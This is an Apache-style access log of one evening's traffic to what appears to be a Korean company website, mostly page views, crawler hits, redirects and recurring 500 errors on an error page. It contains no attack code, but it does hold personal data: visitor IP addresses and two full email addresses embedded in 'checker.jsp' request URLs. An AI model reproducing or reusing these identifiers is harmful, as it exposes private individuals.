34.216.175.253 - - [02/Feb/2020:14:43:14 +0900] "GET /home/news/news/view.do?num=1 HTTP/1.1" 200 8971
34.216.175.253 - - [02/Feb/2020:14:43:22 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.216.175.253 - - [02/Feb/2020:14:43:22 +0900] "GET /home/about/about.do HTTP/1.1" 200 14216
34.216.175.253 - - [02/Feb/2020:14:43:31 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.216.175.253 - - [02/Feb/2020:14:43:31 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
34.216.175.253 - - [02/Feb/2020:14:43:38 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.216.175.253 - - [02/Feb/2020:14:43:38 +0900] "GET /home/news/news/list.do?page= HTTP/1.1" 200 7091
34.216.175.253 - - [02/Feb/2020:14:43:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.216.175.253 - - [02/Feb/2020:14:43:44 +0900] "GET /home/news/news/view.do?page=&num=2 HTTP/1.1" 200 6974
17.58.96.164 - - [02/Feb/2020:14:51:33 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
17.58.96.118 - - [02/Feb/2020:14:51:33 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7162
40.77.167.16 - - [02/Feb/2020:14:57:27 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.203.111.218 - - [02/Feb/2020:14:58:10 +0900] "GET /index.jsp HTTP/1.1" 302 -
159.203.111.218 - - [02/Feb/2020:14:58:12 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
159.203.111.218 - - [02/Feb/2020:14:58:28 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
159.203.111.218 - - [02/Feb/2020:14:58:33 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
159.203.111.218 - - [02/Feb/2020:14:58:33 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
159.203.111.218 - - [02/Feb/2020:14:58:33 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
159.203.111.218 - - [02/Feb/2020:14:58:33 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
159.203.111.218 - - [02/Feb/2020:14:58:33 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
159.203.111.218 - - [02/Feb/2020:14:58:36 +0900] "GET /home/contact/contact.do HTTP/1.1" 200 5224
159.203.111.218 - - [02/Feb/2020:14:58:36 +0900] "GET /home/about/about.do HTTP/1.1" 200 14216
159.203.111.218 - - [02/Feb/2020:14:58:36 +0900] "GET /home/news/news/view.do?num=1 HTTP/1.1" 200 8971
159.203.111.218 - - [02/Feb/2020:14:58:36 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
159.203.111.218 - - [02/Feb/2020:14:58:36 +0900] "GET /home/news/news/view.do?num=3 HTTP/1.1" 200 5573
159.203.111.218 - - [02/Feb/2020:14:58:36 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7162
34.207.249.20 - - [02/Feb/2020:14:59:31 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.207.249.20 - - [02/Feb/2020:14:59:33 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [02/Feb/2020:15:02:23 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
66.249.79.156 - - [02/Feb/2020:15:02:58 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
36.228.41.124 - - [02/Feb/2020:15:08:59 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
60.211.78.243 - - [02/Feb/2020:15:11:00 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 302 -
60.211.78.243 - - [02/Feb/2020:15:11:00 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 7252
60.211.78.243 - - [02/Feb/2020:15:11:07 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
169.197.108.38 - - [02/Feb/2020:15:12:30 +0900] "GET /index.jsp HTTP/1.1" 302 -
169.197.108.38 - - [02/Feb/2020:15:12:31 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
66.249.79.156 - - [02/Feb/2020:15:13:01 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
138.204.180.36 - - [02/Feb/2020:15:16:05 +0900] "GET /index.jsp HTTP/1.1" 302 -
193.111.62.163 - - [02/Feb/2020:15:18:46 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
66.249.79.156 - - [02/Feb/2020:15:22:50 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
116.32.232.24 - - [02/Feb/2020:15:24:11 +0900] "GET /index.jsp HTTP/1.1" 302 -
116.32.232.24 - - [02/Feb/2020:15:24:11 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
116.32.232.24 - - [02/Feb/2020:15:24:17 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
116.32.232.24 - - [02/Feb/2020:15:25:25 +0900] "GET /home/meetourpartners/overseas.do HTTP/1.1" 200 32620
185.216.140.6 - - [02/Feb/2020:15:27:07 +0900] "GET /index.jsp HTTP/1.1" 302 -
23.100.232.233 - - [02/Feb/2020:15:30:14 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
103.131.71.49 - - [02/Feb/2020:15:30:59 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
103.131.71.38 - - [02/Feb/2020:15:31:01 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
103.131.71.41 - - [02/Feb/2020:15:31:05 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
125.209.235.184 - - [02/Feb/2020:15:31:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:15:32:49 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
223.62.203.113 - - [02/Feb/2020:15:36:46 +0900] "GET /filter/checker.jsp?campaignID=426&email=ithong77@naver.com&responseEnd=2018-12-13 HTTP/1.1" 404 3570
60.211.78.243 - - [02/Feb/2020:15:41:48 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 302 -
60.211.78.243 - - [02/Feb/2020:15:41:48 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 7252
66.249.79.156 - - [02/Feb/2020:15:42:58 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
110.229.216.110 - - [02/Feb/2020:15:52:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
110.229.216.110 - - [02/Feb/2020:15:52:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
23.100.232.233 - - [02/Feb/2020:16:05:28 +0900] "GET /index.jsp HTTP/1.1" 302 -
23.100.232.233 - - [02/Feb/2020:16:05:29 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
45.33.66.85 - - [02/Feb/2020:16:12:20 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.158 - - [02/Feb/2020:16:13:00 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [02/Feb/2020:16:15:21 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
222.186.19.221 - - [02/Feb/2020:16:20:45 +0900] "CONNECT /index.jsp HTTP/1.1" 405 1105
66.249.79.156 - - [02/Feb/2020:16:22:54 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.199.176.251 - - [02/Feb/2020:16:23:00 +0900] "GET /index.jsp HTTP/1.1" 302 -
34.199.176.251 - - [02/Feb/2020:16:23:01 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
77.75.77.54 - - [02/Feb/2020:16:27:13 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
101.21.147.4 - - [02/Feb/2020:16:33:53 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.199.176.251 - - [02/Feb/2020:16:37:20 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
23.100.232.233 - - [02/Feb/2020:16:41:49 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
66.249.79.156 - - [02/Feb/2020:16:42:59 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:16:55:23 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
119.207.72.73 - - [02/Feb/2020:16:57:27 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7162
119.207.72.114 - - [02/Feb/2020:16:57:34 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
119.207.72.68 - - [02/Feb/2020:16:57:35 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
66.249.79.156 - - [02/Feb/2020:17:03:29 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [02/Feb/2020:17:15:07 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
117.111.2.220 - - [02/Feb/2020:17:21:05 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 302 -
117.111.2.220 - - [02/Feb/2020:17:21:05 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
66.249.79.157 - - [02/Feb/2020:17:23:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
119.207.72.183 - - [02/Feb/2020:17:25:23 +0900] "GET /index.jsp HTTP/1.1" 302 -
119.207.72.183 - - [02/Feb/2020:17:25:23 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
125.209.235.170 - - [02/Feb/2020:17:31:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
42.236.10.108 - - [02/Feb/2020:17:36:03 +0900] "GET /index.jsp HTTP/1.1" 302 -
58.44.13.221 - - [02/Feb/2020:17:43:47 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
54.183.150.98 - - [02/Feb/2020:17:50:09 +0900] "HEAD /index.jsp HTTP/1.1" 302 -
54.183.150.98 - - [02/Feb/2020:17:50:09 +0900] "HEAD /home/main/main.do HTTP/1.1" 200 -
66.249.79.55 - - [02/Feb/2020:18:03:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
34.74.180.133 - - [02/Feb/2020:18:07:16 +0900] "GET /index.jsp HTTP/1.1" 302 -
34.74.180.133 - - [02/Feb/2020:18:07:16 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
34.199.176.251 - - [02/Feb/2020:18:07:51 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
34.199.176.251 - - [02/Feb/2020:18:07:52 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
34.199.176.251 - - [02/Feb/2020:18:08:48 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
34.199.176.251 - - [02/Feb/2020:18:08:49 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
34.199.176.251 - - [02/Feb/2020:18:11:39 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
34.199.176.251 - - [02/Feb/2020:18:11:40 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:18:13:31 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
60.211.78.243 - - [02/Feb/2020:18:13:48 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 302 -
60.211.78.243 - - [02/Feb/2020:18:13:48 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 7252
193.111.62.163 - - [02/Feb/2020:18:17:04 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
40.77.167.131 - - [02/Feb/2020:18:22:31 +0900] "GET /home/news/news/view.do?page=&num=2 HTTP/1.1" 200 6974
66.249.79.61 - - [02/Feb/2020:18:23:22 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
121.254.147.237 - - [02/Feb/2020:18:26:02 +0900] "GET /index.jsp HTTP/1.1" 302 -
121.254.147.237 - - [02/Feb/2020:18:26:02 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
180.71.76.91 - - [02/Feb/2020:18:31:16 +0900] "GET /index.jsp HTTP/1.1" 302 -
180.71.76.91 - - [02/Feb/2020:18:31:16 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
180.71.76.91 - - [02/Feb/2020:18:31:16 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
180.71.76.91 - - [02/Feb/2020:18:31:16 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
180.71.76.91 - - [02/Feb/2020:18:31:19 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
219.131.56.93 - - [02/Feb/2020:18:35:51 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:18:36:45 +0900] "GET /index.jsp HTTP/1.1" 302 -
66.249.79.61 - - [02/Feb/2020:18:43:16 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
157.55.39.33 - - [02/Feb/2020:18:46:14 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
40.77.167.201 - - [02/Feb/2020:18:46:16 +0900] "GET /index.jsp HTTP/1.1" 302 -
157.55.39.23 - - [02/Feb/2020:18:50:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:18:50:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:18:53:28 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
17.58.96.118 - - [02/Feb/2020:18:54:46 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
40.77.167.32 - - [02/Feb/2020:19:01:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:19:03:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
35.166.34.23 - - [02/Feb/2020:19:04:14 +0900] "GET /index.jsp HTTP/1.1" 302 -
66.249.79.55 - - [02/Feb/2020:19:09:06 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
89.248.174.146 - - [02/Feb/2020:19:10:41 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:19:13:41 +0900] "GET /home/en/whoweare/china.do HTTP/1.1" 200 10353
66.249.79.122 - - [02/Feb/2020:19:17:02 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [02/Feb/2020:19:18:37 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
66.249.79.156 - - [02/Feb/2020:19:26:46 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
39.123.23.90 - - [02/Feb/2020:19:31:01 +0900] "GET /index.jsp HTTP/1.1" 302 -
39.123.23.90 - - [02/Feb/2020:19:31:01 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
39.123.23.90 - - [02/Feb/2020:19:31:02 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
39.123.23.90 - - [02/Feb/2020:19:31:02 +0900] "GET /index.jsp HTTP/1.0" 302 -
125.209.235.177 - - [02/Feb/2020:19:31:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:19:36:53 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:19:46:58 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
180.191.118.142 - - [02/Feb/2020:19:50:57 +0900] "GET /index.jsp HTTP/1.1" 302 -
180.191.118.142 - - [02/Feb/2020:19:50:57 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
40.77.167.32 - - [02/Feb/2020:19:51:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:19:52:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:19:56:57 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:20:00:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:20:01:43 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.94 - - [02/Feb/2020:20:02:59 +0900] "GET /index.jsp HTTP/1.1" 302 -
38.99.62.94 - - [02/Feb/2020:20:02:59 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
157.55.39.187 - - [02/Feb/2020:20:05:23 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [02/Feb/2020:20:07:08 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
34.199.176.251 - - [02/Feb/2020:20:07:29 +0900] "GET /home/news/news/view.do?num=3 HTTP/1.1" 200 5573
34.199.176.251 - - [02/Feb/2020:20:07:30 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
23.100.232.233 - - [02/Feb/2020:20:14:22 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
66.249.79.120 - - [02/Feb/2020:20:16:47 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [02/Feb/2020:20:20:09 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
222.122.190.83 - - [02/Feb/2020:20:21:50 +0900] "GET /index.jsp HTTP/1.1" 302 -
222.122.190.83 - - [02/Feb/2020:20:21:50 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
222.122.190.83 - - [02/Feb/2020:20:21:50 +0900] "GET /index.jsp HTTP/1.1" 302 -
222.122.190.83 - - [02/Feb/2020:20:21:50 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
222.122.190.83 - - [02/Feb/2020:20:21:51 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.82.41.92 - - [02/Feb/2020:20:22:27 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
66.249.79.157 - - [02/Feb/2020:20:26:39 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:20:29:50 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:20:36:41 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
180.105.192.166 - - [02/Feb/2020:20:39:52 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
221.149.56.121 - - [02/Feb/2020:20:39:55 +0900] "GET /index.jsp HTTP/1.1" 302 -
221.149.56.121 - - [02/Feb/2020:20:39:55 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
221.149.56.121 - - [02/Feb/2020:20:40:01 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
40.77.167.201 - - [02/Feb/2020:20:42:51 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
77.236.233.171 - - [02/Feb/2020:20:44:06 +0900] "GET /index.jsp HTTP/1.1" 302 -
49.167.108.198 - - [02/Feb/2020:20:46:09 +0900] "GET /index.jsp HTTP/1.1" 302 -
49.167.108.198 - - [02/Feb/2020:20:46:09 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
49.167.108.198 - - [02/Feb/2020:20:46:13 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
49.167.108.198 - - [02/Feb/2020:20:46:14 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
40.77.167.201 - - [02/Feb/2020:20:46:16 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:20:46:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
49.167.108.198 - - [02/Feb/2020:20:46:58 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
49.167.108.198 - - [02/Feb/2020:20:46:59 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
49.167.108.198 - - [02/Feb/2020:20:47:13 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
49.167.108.198 - - [02/Feb/2020:20:47:20 +0900] "GET /home/about/about.do HTTP/1.1" 200 14216
49.167.108.198 - - [02/Feb/2020:20:47:22 +0900] "GET /home/contact/contact.do HTTP/1.1" 200 5224
66.249.79.158 - - [02/Feb/2020:21:06:56 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:21:15:01 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [02/Feb/2020:21:16:07 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
66.249.79.156 - - [02/Feb/2020:21:16:52 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
107.21.1.8 - - [02/Feb/2020:21:17:31 +0900] "GET /index.jsp HTTP/1.1" 302 -
107.21.1.8 - - [02/Feb/2020:21:17:31 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
54.208.102.37 - - [02/Feb/2020:21:17:33 +0900] "GET /index.jsp HTTP/1.1" 302 -
54.208.102.37 - - [02/Feb/2020:21:17:33 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
66.249.79.156 - - [02/Feb/2020:21:27:06 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
45.33.66.85 - - [02/Feb/2020:21:27:19 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
77.75.77.11 - - [02/Feb/2020:21:29:55 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
125.209.235.175 - - [02/Feb/2020:21:31:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:21:33:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
23.100.232.233 - - [02/Feb/2020:21:34:47 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
40.77.167.201 - - [02/Feb/2020:21:36:46 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:21:41:09 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.199.176.251 - - [02/Feb/2020:21:47:46 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
34.199.176.251 - - [02/Feb/2020:21:47:47 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:21:51:10 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
60.211.78.243 - - [02/Feb/2020:21:56:09 +0900] "GET /index.jsp HTTP/1.1" 302 -
60.211.78.243 - - [02/Feb/2020:21:56:10 +0900] "GET /home/en/main/main.do HTTP/1.1" 302 -
60.211.78.243 - - [02/Feb/2020:21:56:11 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 8279
60.211.78.243 - - [02/Feb/2020:21:56:22 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
211.214.19.243 - - [02/Feb/2020:21:56:37 +0900] "GET /index.jsp HTTP/1.1" 302 -
211.214.19.243 - - [02/Feb/2020:21:56:37 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
211.214.19.243 - - [02/Feb/2020:21:56:37 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
211.214.19.243 - - [02/Feb/2020:21:56:38 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
211.214.19.243 - - [02/Feb/2020:21:56:52 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 105128
211.214.19.243 - - [02/Feb/2020:21:57:05 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
211.214.19.243 - - [02/Feb/2020:21:57:25 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 105128
211.214.19.243 - - [02/Feb/2020:21:57:28 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
40.77.167.201 - - [02/Feb/2020:22:02:38 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
220.86.91.107 - - [02/Feb/2020:22:07:19 +0900] "GET /filter/checker.jsp?campaignID=276&email=yangkj2013@naver.com&responseEnd=2018-12-04 HTTP/1.1" 404 3570
193.111.62.163 - - [02/Feb/2020:22:17:35 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
23.100.232.233 - - [02/Feb/2020:22:18:19 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
220.191.14.58 - - [02/Feb/2020:22:19:16 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
40.77.167.131 - - [02/Feb/2020:22:26:13 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:22:26:18 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:22:27:43 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:22:27:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:22:35:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.187 - - [02/Feb/2020:22:35:51 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:22:36:00 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.187 - - [02/Feb/2020:22:36:06 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:22:40:58 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.131 - - [02/Feb/2020:22:41:23 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:22:51:31 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.79.124.251 - - [02/Feb/2020:22:57:09 +0900] "GET /index.jsp HTTP/1.1" 302 -
66.249.79.156 - - [02/Feb/2020:23:01:50 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.122 - - [02/Feb/2020:23:02:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.122 - - [02/Feb/2020:23:03:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
23.100.232.233 - - [02/Feb/2020:23:04:01 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
66.249.79.122 - - [02/Feb/2020:23:04:42 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.122 - - [02/Feb/2020:23:08:06 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.122 - - [02/Feb/2020:23:09:51 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.156 - - [02/Feb/2020:23:11:56 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [02/Feb/2020:23:11:56 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
40.77.167.201 - - [02/Feb/2020:23:17:10 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
39.99.253.234 - - [02/Feb/2020:23:18:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
39.99.253.234 - - [02/Feb/2020:23:18:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
39.99.253.234 - - [02/Feb/2020:23:18:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
39.99.253.234 - - [02/Feb/2020:23:18:12 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
39.99.253.234 - - [02/Feb/2020:23:18:13 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
40.77.167.201 - - [02/Feb/2020:23:19:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
77.75.78.164 - - [02/Feb/2020:23:20:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [02/Feb/2020:23:21:50 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
193.111.62.163 - - [02/Feb/2020:23:22:11 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
54.37.130.97 - - [02/Feb/2020:23:22:58 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
54.37.130.97 - - [02/Feb/2020:23:22:59 +0900] "GET /home/en/about/about.do HTTP/1.1" 200 14811
178.93.38.44 - - [02/Feb/2020:23:23:57 +0900] "GET /index.jsp HTTP/1.1" 302 -
198.27.74.64 - - [02/Feb/2020:23:29:05 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [02/Feb/2020:23:31:49 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
66.249.79.157 - - [02/Feb/2020:23:31:50 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.180 - - [02/Feb/2020:23:33:43 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.187 - - [02/Feb/2020:23:35:56 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
95.216.32.32 - - [02/Feb/2020:23:43:06 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
211.214.19.243 - - [02/Feb/2020:23:48:44 +0900] "GET /index.jsp HTTP/1.1" 302 -
211.214.19.243 - - [02/Feb/2020:23:48:44 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
211.214.19.243 - - [02/Feb/2020:23:48:44 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
211.214.19.243 - - [02/Feb/2020:23:48:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
